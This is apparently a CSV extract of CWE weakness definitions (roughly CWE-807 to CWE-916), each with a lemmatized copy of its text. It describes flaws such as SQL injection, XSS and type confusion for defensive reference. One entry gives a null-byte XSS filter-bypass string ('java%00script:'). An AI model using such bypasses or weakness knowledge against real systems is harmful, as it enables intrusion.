CWE-807,Reliance on Untrusted Inputs in a Security Decision,"The product uses a protection mechanism that relies on the existence or values of an input, but the input can be modified by an untrusted actor in a way that bypasses the protection mechanism.Developers may assume that inputs such as cookies, environment variables, and hidden form fields cannot be modified. However, an attacker could change these inputs using customized clients or other attacks. This change might not be detected. When security decisions such as authentication and authorization are made based on the values of these inputs, attackers can bypass the security of the software.Without sufficient encryption, integrity checking, or other mechanism, any input that originates from an outsider cannot be trusted.",product use protection mechanism rely existence value input input modify untrusted actor way bypass protection mechanism developer assume input cookie environment variable hide form field modify attacker change input customize client attack change detect security decision authentication authorization base value input attacker bypass security software sufficient encryption integrity checking mechanism input originate outsider trust
CWE-81,Improper Neutralization of Script in an Error Message Web Page,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special characters that could be interpreted as web-scripting elements when they are sent to an error page.Error pages may include customized 403 Forbidden or 404 Not Found pages.When an attacker can trigger an error that contains script syntax within the attacker's input, then cross-site scripting attacks may be possible.",product receive input upstream component neutralize incorrectly neutralize special character interpret web scripting element send error page error page include customize forbidden find page attacker trigger error contain script syntax attacker input cross site scripting attack possible
CWE-82,Improper Neutralization of Script in Attributes of IMG Tags in a Web Page,"The web application does not neutralize or incorrectly neutralizes scripting elements within attributes of HTML IMG tags, such as the src attribute.Attackers can embed XSS exploits into the values for IMG attributes (e.g. SRC) that is streamed and then executed in a victim's browser. Note that when the page is loaded into a user's browsers, the exploit will automatically execute.",web application neutralize incorrectly neutralize scripting element attribute html img tag src attribute attacker embed xss exploit value img attribute src stream execute victim browser note page load user browser exploit automatically execute
CWE-820,Missing Synchronization,"The product utilizes a shared resource in a concurrent manner but does not attempt to synchronize access to the resource.If access to a shared resource is not synchronized, then the resource may not be in a state that is expected by the product. This might lead to unexpected or insecure behaviors, especially if an attacker can influence the shared resource.",product utilize share resource concurrent manner attempt synchronize access resource access share resource synchronize resource state expect product lead unexpected insecure behavior especially attacker influence share resource
CWE-821,Incorrect Synchronization,"The product utilizes a shared resource in a concurrent manner, but it does not correctly synchronize access to the resource.If access to a shared resource is not correctly synchronized, then the resource may not be in a state that is expected by the product. This might lead to unexpected or insecure behaviors, especially if an attacker can influence the shared resource.",product utilize share resource concurrent manner correctly synchronize access resource access share resource correctly synchronize resource state expect product lead unexpected insecure behavior especially attacker influence share resource
CWE-822,Untrusted Pointer Dereference,"The product obtains a value from an untrusted source, converts this value to a pointer, and dereferences the resulting pointer.An attacker can supply a pointer for memory locations that the product is not expecting. If the pointer is dereferenced for a write operation, the attack might allow modification of critical state variables, cause a crash, or execute code. If the dereferencing operation is for a read, then the attack might allow reading of sensitive data, cause a crash, or set a variable to an unexpected value (since the value will be read from an unexpected memory location).There are several variants of this weakness, including but not necessarily limited to:The untrusted value is directly invoked as a function call.In OS kernels or drivers where there is a boundary between ""userland"" and privileged memory spaces, an untrusted pointer might enter through an API or system call (see CWE-781 for one such example).Inadvertently accepting the value from an untrusted control sphere when it did not have to be accepted as input at all. This might occur when the code was originally developed to be run by a single user in a non-networked environment, and the code is then ported to or otherwise exposed to a networked environment.",product obtain value untrusted source convert value pointer dereference result pointer attacker supply pointer memory location product expect pointer dereference write operation attack allow modification critical state variable cause crash execute code dereference operation read attack allow reading sensitive datum cause crash set variable unexpected value value read unexpected memory variant weakness include necessarily limit untrusted value directly invoke function os kernel driver boundary userland privileged memory space untrusted pointer enter api system accept value untrusted control sphere accept input occur code originally develop run single user non networked environment code port expose networked environment
CWE-823,Use of Out-of-range Pointer Offset,"The product performs pointer arithmetic on a valid pointer, but it uses an offset that can point outside of the intended range of valid memory locations for the resulting pointer.While a pointer can contain a reference to any arbitrary memory location, a program typically only intends to use the pointer to access limited portions of memory, such as contiguous memory used to access an individual array.Programs may use offsets in order to access fields or sub-elements stored within structured data. The offset might be out-of-range if it comes from an untrusted source, is the result of an incorrect calculation, or occurs because of another error.If an attacker can control or influence the offset so that it points outside of the intended boundaries of the structure, then the attacker may be able to read or write to memory locations that are used elsewhere in the product. As a result, the attack might change the state of the product as accessed through program variables, cause a crash or instable behavior, and possibly lead to code execution.",product perform pointer arithmetic valid pointer use offset point outside intended range valid memory location result pointer pointer contain reference arbitrary memory location program typically intend use pointer access limited portion memory contiguous memory access individual array program use offset order access field sub element store structured datum offset range come untrusted source result incorrect calculation occur error attacker control influence offset point outside intended boundary structure attacker able read write memory location product result attack change state product access program variable cause crash instable behavior possibly lead code execution
CWE-824,Access of Uninitialized Pointer,"The product accesses or uses a pointer that has not been initialized.If the pointer contains an uninitialized value, then the value might not point to a valid memory location. This could cause the product to read from or write to unexpected memory locations, leading to a denial of service. If the uninitialized pointer is used as a function call, then arbitrary functions could be invoked. If an attacker can influence the portion of uninitialized memory that is contained in the pointer, this weakness could be leveraged to execute code or perform other attacks.Depending on memory layout, associated memory management behaviors, and product operation, the attacker might be able to influence the contents of the uninitialized pointer, thus gaining more fine-grained control of the memory location to be accessed.",product access use pointer initialize pointer contain uninitialized value value point valid memory location cause product read write unexpected memory location lead denial service uninitialized pointer function arbitrary function invoke attacker influence portion uninitialized memory contain pointer weakness leverage execute code perform attack depend memory layout associated memory management behavior product operation attacker able influence content uninitialized pointer gain fine grained control memory location access
CWE-825,Expired Pointer Dereference,"The product dereferences a pointer that contains a location for memory that was previously valid, but is no longer valid.When a product releases memory, but it maintains a pointer to that memory, then the memory might be re-allocated at a later time. If the original pointer is accessed to read or write data, then this could cause the product to read or modify data that is in use by a different function or process. Depending on how the newly-allocated memory is used, this could lead to a denial of service, information exposure, or code execution.",product dereference pointer contain location memory previously valid long valid product release memory maintain pointer memory memory allocate later time original pointer access read write datum cause product read modify datum use different function process depend newly allocate memory lead denial service information exposure code execution
CWE-826,Premature Release of Resource During Expected Lifetime,"The product releases a resource that is still intended to be used by itself or another actor.This weakness focuses on errors in which the product should not release a resource, but performs the release anyway. This is different than a weakness in which the product releases a resource at the appropriate time, but it maintains a reference to the resource, which it later accesses. For this weakness, the resource should still be valid upon the subsequent access.When a product releases a resource that is still being used, it is possible that operations will still be taken on this resource, which may have been repurposed in the meantime, leading to issues similar to CWE-825. Consequences may include denial of service, information exposure, or code execution.",product release resource intend actor weakness focus error product release resource perform release different weakness product release resource appropriate time maintain reference resource later access weakness resource valid subsequent access product release resource possible operation take resource repurpose meantime lead issue similar consequence include denial service information exposure code execution
CWE-827,Improper Control of Document Type Definition,"The product does not restrict a reference to a Document Type Definition (DTD) to the intended control sphere. This might allow attackers to reference arbitrary DTDs, possibly causing the product to expose files, consume excessive system resources, or execute arbitrary http requests on behalf of the attacker.As DTDs are processed, they might try to read or include files on the machine performing the parsing. If an attacker is able to control the DTD, then the attacker might be able to specify sensitive resources or requests or provide malicious content.For example, the SOAP specification prohibits SOAP messages from containing DTDs.",product restrict reference document type definition dtd intended control sphere allow attacker reference arbitrary dtd possibly cause product expose file consume excessive system resource execute arbitrary http request behalf attacker dtd process try read include file machine perform parsing attacker able control dtd attacker able specify sensitive resource request provide malicious content example soap specification prohibit soap message contain dtd
CWE-828,Signal Handler with Functionality that is not Asynchronous-Safe,"The product defines a signal handler that contains code sequences that are not asynchronous-safe, i.e., the functionality is not reentrant, or it can be interrupted.This can lead to an unexpected system state with a variety of potential consequences depending on context, including denial of service and code execution.Signal handlers are typically intended to interrupt normal functionality of a program, or even other signals, in order to notify the process of an event. When a signal handler uses global or static variables, or invokes functions that ultimately depend on such state or its associated metadata, then it could corrupt system state that is being used by normal functionality. This could subject the program to race conditions or other weaknesses that allow an attacker to cause the program state to be corrupted. While denial of service is frequently the consequence, in some cases this weakness could be leveraged for code execution.There are several different scenarios that introduce this issue:Invocation of non-reentrant functions from within the handler. One example is malloc(), which modifies internal global variables as it manages memory. Very few functions are actually reentrant.Code sequences (not necessarily function calls) contain non-atomic use of global variables, or associated metadata or structures, that can be accessed by other functionality of the program, including other signal handlers. Frequently, the same function is registered to handle multiple signals.The signal handler function is intended to run at most one time, but instead it can be invoked multiple times. This could happen by repeated delivery of the same signal, or by delivery of different signals that have the same handler function (CWE-831).Note that in some environments or contexts, it might be possible for the signal handler to be interrupted itself.If both a signal handler and the normal behavior of the product have to operate on the same set of state variables, and a signal is received in the middle of the normal execution's modifications of those variables, the variables may be in an incorrect or corrupt state during signal handler execution, and possibly still incorrect or corrupt upon return.",product define signal handler contain code sequence asynchronous safe functionality reentrant interrupt lead unexpected system state variety potential consequence depend context include denial service code execution signal handler typically intend interrupt normal functionality program signal order notify process event signal handler use global static variable invoke function ultimately depend state associate metadata corrupt system state normal functionality subject program race condition weakness allow attacker cause program state corrupt denial service frequently consequence case weakness leverage code execution different scenario introduce issue invocation non reentrant function handler example malloc modify internal global variable manage memory function actually reentrant code sequence necessarily function call contain non atomic use global variable associate metadata structure access functionality program include signal handler frequently function register handle multiple signal signal handler function intend run time instead invoke multiple time happen repeat delivery signal delivery different signal handler function environment context possible signal handler interrupt signal handler normal behavior product operate set state variable signal receive middle normal execution modification variable variable incorrect corrupt state signal handler execution possibly incorrect corrupt return
CWE-829,Inclusion of Functionality from Untrusted Control Sphere,"The product imports, requires, or includes executable functionality (such as a library) from a source that is outside of the intended control sphere.When including third-party functionality, such as a web widget, library, or other source of functionality, the product must effectively trust that functionality. Without sufficient protection mechanisms, the functionality could be malicious in nature (either by coming from an untrusted source, being spoofed, or being modified in transit from a trusted source). The functionality might also contain its own weaknesses, or grant access to additional functionality and state information that should be kept private to the base system, such as system state information, sensitive application data, or the DOM of a web application.This might lead to many different consequences depending on the included functionality, but some examples include injection of malware, information exposure by granting excessive privileges or permissions to the untrusted functionality, DOM-based XSS vulnerabilities, stealing user's cookies, or open redirect to malware (CWE-601).",product import require include executable functionality library source outside intended control sphere include party functionality web widget library source functionality product effectively trust functionality sufficient protection mechanism functionality malicious nature come untrusted source spoof modify transit trusted source functionality contain weakness grant access additional functionality state information keep private base system system state information sensitive application datum dom web application lead different consequence depend include functionality example include injection malware information exposure grant excessive privilege permission untrusted functionality dom base xss vulnerability steal user cookie open redirect malware
CWE-83,Improper Neutralization of Script in Attributes in a Web Page,"The product does not neutralize or incorrectly neutralizes ""javascript:"" or other URIs from dangerous attributes within tags, such as onmouseover, onload, onerror, or style.",product neutralize incorrectly neutralize javascript uri dangerous attribute tag onmouseover onload onerror style
CWE-830,Inclusion of Web Functionality from an Untrusted Source,"The product includes web functionality (such as a web widget) from another domain, which causes it to operate within the domain of the product, potentially granting total access and control of the product to the untrusted source.Including third party functionality in a web-based environment is risky, especially if the source of the functionality is untrusted.Even if the third party is a trusted source, the product may still be exposed to attacks and malicious behavior if that trusted source is compromised, or if the code is modified in transmission from the third party to the product.This weakness is common in ""mashup"" development on the web, which may include source functionality from other domains. For example, Javascript-based web widgets may be inserted by using '<SCRIPT SRC=""http://other.domain.here"">' tags, which causes the code to run in the domain of the product, not the remote site from which the widget was loaded. As a result, the included code has access to the local DOM, including cookies and other data that the developer might not want the remote site to be able to access.Such dependencies may be desirable, or even required, but sometimes programmers are not aware that a dependency exists.",product include web functionality web widget domain cause operate domain product potentially grant total access control product untrusted source include party functionality web base environment risky especially source functionality untrusted party trust source product expose attack malicious behavior trusted source compromise code modify transmission party product weakness common mashup development web include source functionality domain example javascript base web widget insert script tag cause code run domain product remote site widget load result include code access local dom include cookie datum developer want remote site able access dependency desirable require programmer aware dependency exist
CWE-831,Signal Handler Function Associated with Multiple Signals,"The product defines a function that is used as a handler for more than one signal.While sometimes intentional and safe, when the same function is used to handle multiple signals, a race condition could occur if the function uses any state outside of its local declaration, such as global variables or non-reentrant functions, or has any side effects.An attacker could send one signal that invokes the handler function; in many OSes, this will typically prevent the same signal from invoking the handler again, at least until the handler function has completed execution. However, the attacker could then send a different signal that is associated with the same handler function. This could interrupt the original handler function while it is still executing. If there is shared state, then the state could be corrupted. This can lead to a variety of potential consequences depending on context, including denial of service and code execution.Another rarely-explored possibility arises when the signal handler is only designed to be executed once (if at all). By sending multiple signals, an attacker could invoke the function more than once. This may generate extra, unintended side effects. A race condition might not even be necessary; the attacker could send one signal, wait until it is handled, then send the other signal.",product define function handler signal intentional safe function handle multiple signal race condition occur function use state outside local declaration global variable non reentrant function effect attacker send signal invoke handler function os typically prevent signal invoke handler handler function complete execution attacker send different signal associate handler function interrupt original handler function execute share state state corrupt lead variety potential consequence depend context include denial service code execution rarely explore possibility arise signal handler design execute send multiple signal attacker invoke function generate extra unintended effect race condition necessary attacker send signal wait handle send signal
CWE-832,Unlock of a Resource that is not Locked,"The product attempts to unlock a resource that is not locked.Depending on the locking functionality, an unlock of a non-locked resource might cause memory corruption or other modification to the resource (or its associated metadata that is used for tracking locks).",product attempt unlock resource lock depend locking functionality unlock non locked resource cause memory corruption modification resource associate metadata track lock
CWE-833,Deadlock,"The product contains multiple threads or executable segments that are waiting for each other to release a necessary lock, resulting in deadlock.",product contain multiple thread executable segment wait release necessary lock result deadlock
CWE-834,Excessive Iteration,"The product performs an iteration or loop without sufficiently limiting the number of times that the loop is executed.If the iteration can be influenced by an attacker, this weakness could allow attackers to consume excessive resources such as CPU or memory. In many cases, a loop does not need to be infinite in order to cause enough resource consumption to adversely affect the product or its host system; it depends on the amount of resources consumed per iteration.",product perform iteration loop sufficiently limit number time loop execute iteration influence attacker weakness allow attacker consume excessive resource cpu memory case loop need infinite order cause resource consumption adversely affect product host system depend resource consume iteration
CWE-835,Loop with Unreachable Exit Condition ('Infinite Loop'),"The product contains an iteration or loop with an exit condition that cannot be reached, i.e., an infinite loop.If the loop can be influenced by an attacker, this weakness could allow attackers to consume excessive resources such as CPU or memory.",product contain iteration loop exit condition reach infinite loop loop influence attacker weakness allow attacker consume excessive resource cpu memory
CWE-836,Use of Password Hash Instead of Password for Authentication,"The product records password hashes in a data store, receives a hash of a password from a client, and compares the supplied hash to the hash obtained from the data store.Some authentication mechanisms rely on the client to generate the hash for a password, possibly to reduce load on the server or avoid sending the password across the network. However, when the client is used to generate the hash, an attacker can bypass the authentication by obtaining a copy of the hash, e.g. by using SQL injection to compromise a database of authentication credentials, or by exploiting an information exposure. The attacker could then use a modified client to replay the stolen hash without having knowledge of the original password.As a result, the server-side comparison against a client-side hash does not provide any more security than the use of passwords without hashing.",product record password hash data store receive hash password client compare supply hash hash obtain datum store authentication mechanism rely client generate hash password possibly reduce load server avoid send password network client generate hash attacker bypass authentication obtain copy hash sql injection compromise database authentication credential exploit information exposure attacker use modify client replay steal hash have knowledge original password result server comparison client hash provide security use password hashing
CWE-837,"Improper Enforcement of a Single, Unique Action","The product requires that an actor should only be able to perform an action once, or to have only one unique action, but the product does not enforce or improperly enforces this restriction.In various applications, a user is only expected to perform a certain action once, such as voting, requesting a refund, or making a purchase. When this restriction is not enforced, sometimes this can have security implications. For example, in a voting application, an attacker could attempt to ""stuff the ballot box"" by voting multiple times. If these votes are counted separately, then the attacker could directly affect who wins the vote. This could have significant business impact depending on the purpose of the product.",product require actor able perform action unique action product enforce improperly enforce restriction application user expect perform certain action vote request refund make purchase restriction enforce security implication example voting application attacker attempt stuff ballot box vote multiple time vote count separately attacker directly affect win vote significant business impact depend purpose product
CWE-838,Inappropriate Encoding for Output Context,"The product uses or specifies an encoding when generating output to a downstream component, but the specified encoding is not the same as the encoding that is expected by the downstream component.This weakness can cause the downstream component to use a decoding method that produces different data than what the product intended to send. When the wrong encoding is used - even if closely related - the downstream component could decode the data incorrectly. This can have security consequences when the provided boundaries between control and data are inadvertently broken, because the resulting data could introduce control characters or special elements that were not sent by the product. The resulting data could then be used to bypass protection mechanisms such as input validation, and enable injection attacks.While using output encoding is essential for ensuring that communications between components are accurate, the use of the wrong encoding - even if closely related - could cause the downstream component to misinterpret the output.For example, HTML entity encoding is used for elements in the HTML body of a web page. However, a programmer might use entity encoding when generating output for that is used within an attribute of an HTML tag, which could contain functional Javascript that is not affected by the HTML encoding.While web applications have received the most attention for this problem, this weakness could potentially apply to any type of product that uses a communications stream that could support multiple encodings.",product use specify encoding generate output downstream component specify encoding encoding expect downstream component weakness cause downstream component use decoding method produce different datum product intend send wrong encoding closely relate downstream component decode datum incorrectly security consequence provide boundary control datum inadvertently break result datum introduce control character special element send product result datum bypass protection mechanism input validation enable injection attack output encoding essential ensure communication component accurate use wrong encoding closely relate cause downstream component misinterpret output example html entity encoding element html body web page programmer use entity encoding generate output attribute html tag contain functional javascript affect html encoding web application receive attention problem weakness potentially apply type product use communications stream support multiple encoding
CWE-839,Numeric Range Comparison Without Minimum Check,"The product checks a value to ensure that it is less than or equal to a maximum, but it does not also verify that the value is greater than or equal to the minimum.Some products use signed integers or floats even when their values are only expected to be positive or 0. An input validation check might assume that the value is positive, and only check for the maximum value. If the value is negative, but the code assumes that the value is positive, this can produce an error. The error may have security consequences if the negative value is used for memory allocation, array access, buffer access, etc. Ultimately, the error could lead to a buffer overflow or other type of memory corruption.The use of a negative number in a positive-only context could have security implications for other types of resources. For example, a shopping cart might check that the user is not requesting more than 10 items, but a request for -3 items could cause the application to calculate a negative price and credit the attacker's account.",product check value ensure equal maximum verify value great equal minimum product use sign integer float value expect positive input validation check assume value positive check maximum value value negative code assume value positive produce error error security consequence negative value memory allocation array access buffer access etc ultimately error lead buffer overflow type memory corruption use negative number positive context security implication type resource example shopping cart check user request item request item cause application calculate negative price credit attacker account
CWE-84,Improper Neutralization of Encoded URI Schemes in a Web Page,The web application improperly neutralizes user-controlled input for executable script disguised with URI encodings.,web application improperly neutralize user control input executable script disguise uri encoding
CWE-841,Improper Enforcement of Behavioral Workflow,"The product supports a session in which more than one behavior must be performed by an actor, but it does not properly ensure that the actor performs the behaviors in the required sequence.By performing actions in an unexpected order, or by omitting steps, an attacker could manipulate the business logic of the product or cause it to enter an invalid state. In some cases, this can also expose resultant weaknesses.For example, a file-sharing protocol might require that an actor perform separate steps to provide a username, then a password, before being able to transfer files. If the file-sharing server accepts a password command followed by a transfer command, without any username being provided, the product might still perform the transfer.Note that this is different than CWE-696, which focuses on when the product performs actions in the wrong sequence; this entry is closely related, but it is focused on ensuring that the actor performs actions in the correct sequence.Workflow-related behaviors include:Steps are performed in the expected order.Required steps are not omitted.Steps are not interrupted.Steps are performed in a timely fashion.",product support session behavior perform actor properly ensure actor perform behavior require sequence perform action unexpected order omit step attacker manipulate business logic product cause enter invalid state case expose resultant weakness example file sharing protocol require actor perform separate step provide username password able transfer file file share server accept password command follow transfer command username provide product perform transfer note different focus product perform action wrong sequence entry closely relate focus ensure actor perform action correct sequence workflow relate behavior include step perform expected order required step omit step interrupt step perform timely fashion
CWE-842,Placement of User into Incorrect Group,"The product or the administrator places a user into an incorrect group.If the incorrect group has more access or privileges than the intended group, the user might be able to bypass intended security policy to access unexpected resources or perform unexpected actions. The access-control system might not be able to detect malicious usage of this group membership.",product administrator place user incorrect group incorrect group access privilege intended group user able bypass intended security policy access unexpected resource perform unexpected action access control system able detect malicious usage group membership
CWE-843,Access of Resource Using Incompatible Type ('Type Confusion'),"The product allocates or initializes a resource such as a pointer, object, or variable using one type, but it later accesses that resource using a type that is incompatible with the original type.When the product accesses the resource using an incompatible type, this could trigger logical errors because the resource does not have expected properties. In languages without memory safety, such as C and C++, type confusion can lead to out-of-bounds memory access.While this weakness is frequently associated with unions when parsing data with many different embedded object types in C, it can be present in any application that can interpret the same variable or memory location in multiple ways.This weakness is not unique to C and C++. For example, errors in PHP applications can be triggered by providing array parameters when scalars are expected, or vice versa. Languages such as Perl, which perform automatic conversion of a variable of one type when it is accessed as if it were another type, can also contain these issues.",product allocate initialize resource pointer object variable type later access resource type incompatible original type product access resource incompatible type trigger logical error resource expect property language memory safety c type confusion lead bounds memory access weakness frequently associate union parse datum different embed object type c present application interpret variable memory location multiple way weakness unique c example error php application trigger provide array parameter scalar expect vice versa language perl perform automatic conversion variable type access type contain issue
CWE-85,Doubled Character XSS Manipulations,The web application does not filter user-controlled input for executable script disguised using doubling of the involved characters.,web application filter user control input executable script disguise doubling involve character
CWE-86,Improper Neutralization of Invalid Characters in Identifiers in Web Pages,"The product does not neutralize or incorrectly neutralizes invalid characters or byte sequences in the middle of tag names, URI schemes, and other identifiers.Some web browsers may remove these sequences, resulting in output that may have unintended control implications. For example, the product may attempt to remove a ""javascript:"" URI scheme, but a ""java%00script:"" URI may bypass this check and still be rendered as active javascript by some browsers, allowing XSS or other attacks.",product neutralize incorrectly neutralize invalid character byte sequence middle tag name uri scheme identifier web browser remove sequence result output unintended control implication example product attempt remove javascript uri scheme uri bypass check render active javascript browser allow xss attack
CWE-862,Missing Authorization,"The product does not perform an authorization check when an actor attempts to access a resource or perform an action.Assuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.When access control checks are not applied, users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution.",product perform authorization check actor attempt access resource perform action assume user give identity authorization process determine user access give resource base user privilege permission access control specification apply resource access control check apply user able access datum perform action allow perform lead wide range problem include information exposure denial service arbitrary code execution
CWE-863,Incorrect Authorization,"The product performs an authorization check when an actor attempts to access a resource or perform an action, but it does not correctly perform the check. This allows attackers to bypass intended access restrictions.Assuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.When access control checks are incorrectly applied, users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution.",product perform authorization check actor attempt access resource perform action correctly perform check allow attacker bypass intended access restriction assume user give identity authorization process determine user access give resource base user privilege permission access control specification apply resource access control check incorrectly apply user able access datum perform action allow perform lead wide range problem include information exposure denial service arbitrary code execution
CWE-87,Improper Neutralization of Alternate XSS Syntax,The product does not neutralize or incorrectly neutralizes user-controlled input for alternate script syntax.,product neutralize incorrectly neutralize user control input alternate script syntax
CWE-88,Improper Neutralization of Argument Delimiters in a Command ('Argument Injection'),"The product constructs a string for a command to be executed by a separate componentin another control sphere, but it does not properly delimit theintended arguments, options, or switches within that command string.When creating commands using interpolation into a string, developers may assume that only the arguments/options that they specify will be processed. This assumption may be even stronger when the programmer has encoded the command in a way that prevents separate commands from being provided maliciously, e.g. in the case of shell metacharacters. When constructing the command, the developer may use whitespace or other delimiters that are required to separate arguments when the command. However, if an attacker can provide an untrusted input that contains argument-separating delimiters, then the resulting command will have more arguments than intended by the developer. The attacker may then be able to change the behavior of the command. Depending on the functionality supported by the extraneous arguments, this may have security-relevant consequences.",product construct string command execute separate componentin control sphere properly delimit theintended argument option switch command string create command interpolation string developer assume argument option specify process assumption strong programmer encode command way prevent separate command provide maliciously case shell metacharacter construct command developer use whitespace delimiter require separate argument command attacker provide untrusted input contain argument separate delimiter result command argument intend developer attacker able change behavior command depend functionality support extraneous argument security relevant consequence
CWE-89,Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection'),"The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component.Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data. This can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands.SQL injection has become a common issue with database-driven web sites. The flaw is easily detected, and easily exploited, and as such, any site or product package with even a minimal user base is likely to be subject to an attempted attack of this kind. This flaw depends on the fact that SQL makes no real distinction between the control and data planes.",product construct sql command externally influence input upstream component neutralize incorrectly neutralize special element modify intended sql command send downstream component sufficient removal quoting sql syntax user controllable input generate sql query cause input interpret sql instead ordinary user datum alter query logic bypass security check insert additional statement modify end database possibly include execution system command sql injection common issue database drive web site flaw easily detect easily exploit site product package minimal user base likely subject attempt attack kind flaw depend fact sql make real distinction control datum plane
CWE-9,J2EE Misconfiguration: Weak Access Permissions for EJB Methods,"If elevated access rights are assigned to EJB methods, then an attacker can take advantage of the permissions to exploit the product.If the EJB deployment descriptor contains one or more method permissions that grant access to the special ANYONE role, it indicates that access control for the application has not been fully thought through or that the application is structured in such a way that reasonable access control restrictions are impossible.",elevated access right assign ejb method attacker advantage permission exploit product ejb deployment descriptor contain method permission grant access special role indicate access control application fully think application structure way reasonable access control restriction impossible
CWE-90,Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection'),"The product constructs all or part of an LDAP query using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended LDAP query when it is sent to a downstream component.",product construct ldap query externally influence input upstream component neutralize incorrectly neutralize special element modify intended ldap query send downstream component
CWE-908,Use of Uninitialized Resource,"The product uses or accesses a resource that has not been initialized.When a resource has not been properly initialized, the product may behave unexpectedly. This may lead to a crash or invalid memory access, but the consequences vary depending on the type of resource and how it is used within the product.",product use access resource initialize resource properly initialize product behave unexpectedly lead crash invalid memory access consequence vary depend type resource product
CWE-909,Missing Initialization of Resource,"The product does not initialize a critical resource.Many resources require initialization before they can be properly used. If a resource is not initialized, it could contain unpredictable or expired data, or it could be initialized to defaults that are invalid. This can have security implications when the resource is expected to have certain properties or values.",product initialize critical resource resource require initialization properly resource initialize contain unpredictable expired datum initialize default invalid security implication resource expect certain property value
CWE-91,XML Injection (aka Blind XPath Injection),"The product does not properly neutralize special elements that are used in XML, allowing attackers to modify the syntax, content, or commands of the XML before it is processed by an end system.Within XML, special elements could include reserved words or characters such as ""<"", "">"", """""", and ""&"", which could then be used to add new data or modify XML syntax.",product properly neutralize special element xml allow attacker modify syntax content command xml process end system xml special element include reserve word character add new datum modify xml syntax
CWE-910,Use of Expired File Descriptor,"The product uses or accesses a file descriptor after it has been closed.After a file descriptor for a particular file or device has been released, it can be reused. The code might not write to the original file, since the reused file descriptor might reference a different file or device.",product use access file descriptor close file descriptor particular file device release reuse code write original file reuse file descriptor reference different file device
CWE-911,Improper Update of Reference Count,"The product uses a reference count to manage a resource, but it does not update or incorrectly updates the reference count.Reference counts can be used when tracking how many objects contain a reference to a particular resource, such as in memory management or garbage collection. When the reference count reaches zero, the resource can be de-allocated or reused because there are no more objects that use it. If the reference count accidentally reaches zero, then the resource might be released too soon, even though it is still in use. If all objects no longer use the resource, but the reference count is not zero, then the resource might not ever be released.",product use reference count manage resource update incorrectly update reference count reference count track object contain reference particular resource memory management garbage collection reference count reach zero resource de allocate reuse object use reference count accidentally reach zero resource release soon use object long use resource reference count zero resource release
CWE-912,Hidden Functionality,"The product contains functionality that is not documented, not part of the specification, and not accessible through an interface or command sequence that is obvious to the product's users or administrators.Hidden functionality can take many forms, such as intentionally malicious code, ""Easter Eggs"" that contain extraneous functionality such as games, developer-friendly shortcuts that reduce maintenance or support costs such as hard-coded accounts, etc. From a security perspective, even when the functionality is not intentionally malicious or damaging, it can increase the product's attack surface and expose additional weaknesses beyond what is already exposed by the intended functionality. Even if it is not easily accessible, the hidden functionality could be useful for attacks that modify the control flow of the application.",product contain functionality document specification accessible interface command sequence obvious product user administrator hidden functionality form intentionally malicious code easter egg contain extraneous functionality game developer friendly shortcut reduce maintenance support cost hard code account etc security perspective functionality intentionally malicious damaging increase product attack surface expose additional weakness expose intended functionality easily accessible hidden functionality useful attack modify control flow application
CWE-913,Improper Control of Dynamically-Managed Code Resources,"The product does not properly restrict reading from or writing to dynamically-managed code resources such as variables, objects, classes, attributes, functions, or executable instructions or statements.Many languages offer powerful features that allow the programmer to dynamically create or modify existing code, or resources used by code such as variables and objects. While these features can offer significant flexibility and reduce development time, they can be extremely dangerous if attackers can directly influence these code resources in unexpected ways.",product properly restrict read write dynamically manage code resource variable object class attribute function executable instruction statement language offer powerful feature allow programmer dynamically create modify existing code resource code variable object feature offer significant flexibility reduce development time extremely dangerous attacker directly influence code resource unexpected way
CWE-914,Improper Control of Dynamically-Identified Variables,"The product does not properly restrict reading from or writing to dynamically-identified variables.Many languages offer powerful features that allow the programmer to access arbitrary variables that are specified by an input string. While these features can offer significant flexibility and reduce development time, they can be extremely dangerous if attackers can modify unintended variables that have security implications.",product properly restrict read write dynamically identify variable language offer powerful feature allow programmer access arbitrary variable specify input string feature offer significant flexibility reduce development time extremely dangerous attacker modify unintended variable security implication
CWE-915,Improperly Controlled Modification of Dynamically-Determined Object Attributes,"The product receives input from an upstream component that specifies multiple attributes, properties, or fields that are to be initialized or updated in an object, but it does not properly control which attributes can be modified.If the object contains attributes that were only intended for internal use, then their unexpected modification could lead to a vulnerability.This weakness is sometimes known by the language-specific mechanisms that make it possible, such as mass assignment, autobinding, or object injection.",product receive input upstream component specify multiple attribute property field initialize update object properly control attribute modify object contain attribute intend internal use unexpected modification lead vulnerability weakness know language specific mechanism possible mass assignment autobinding object injection
CWE-916,Use of Password Hash With Insufficient Computational Effort,"The product generates a hash for a password, but it uses a scheme that does not provide a sufficient level of computational effort that would make password cracking attacks infeasible or expensive.Many password storage mechanisms compute a hash and store the hash, instead of storing the original password in plaintext. In this design, authentication involves accepting an incoming password, computing its hash, and comparing it to the stored hash.Many hash algorithms are designed to execute quickly with minimal overhead, even cryptographic hashes. However, this efficiency is a problem for password storage, because it can reduce an attacker's workload for brute-force password cracking. If an attacker can obtain the hashes through some other method (such as SQL injection on a database that stores hashes), then the attacker can store the hashes offline and use various techniques to crack the passwords by computing hashes efficiently. Without a built-in workload, modern attacks can compute large numbers of hashes, or even exhaust the entire space of all possible passwords, within a very short amount of time, using massively-parallel computing (such as cloud computing) and GPU, ASIC, or FPGA hardware. In such a scenario, an efficient hash algorithm helps the attacker.There are several properties of a hash scheme that are relevant to its strength against an offline, massively-parallel attack:The amount of CPU time required to compute the hash (""stretching"")The amount of memory required to compute the hash (""memory-hard"" operations)Including a random value, along with the password, as input to the hash computation (""salting"")Given a hash, there is no known way of determining an input (e.g., a password) that produces this hash value, other than by guessing possible inputs (""one-way"" hashing)Relative to the number of all possible hashes that can be generated by the scheme, there is a low 